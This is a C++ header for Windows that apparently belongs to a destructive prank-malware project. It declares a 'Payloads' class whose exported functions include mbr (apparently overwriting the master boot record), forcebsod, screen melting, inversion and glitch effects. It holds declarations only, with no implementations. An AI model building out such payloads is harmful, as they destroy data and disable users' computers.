#pragma once

#include <iostream>
#include <shlobj.h>
#include <shellapi.h>
#include <winternl.h>
#include <mmsystem.h>
#include <windowsx.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")

namespace Payloads
{
	class Payloads
	{
	public:
		__declspec(dllexport) void mbr();
		__declspec(dllexport) void forcebsod();
		__declspec(dllexport) void ChangeAllText();
		__declspec(dllexport) void ShowAllWindows();
		__declspec(dllexport) void FlipScreen();
		__declspec(dllexport) void InvertScreen();
		__declspec(dllexport) void MeltScreen();
		__declspec(dllexport) void MoveScreen();
		__declspec(dllexport) void ScreenGlitches();
		__declspec(dllexport) void DrawIcons();
		__declspec(dllexport) void RandomIcons();
		__declspec(dllexport) void MoveDown();
		__declspec(dllexport) void FastTunnel();
	};
}
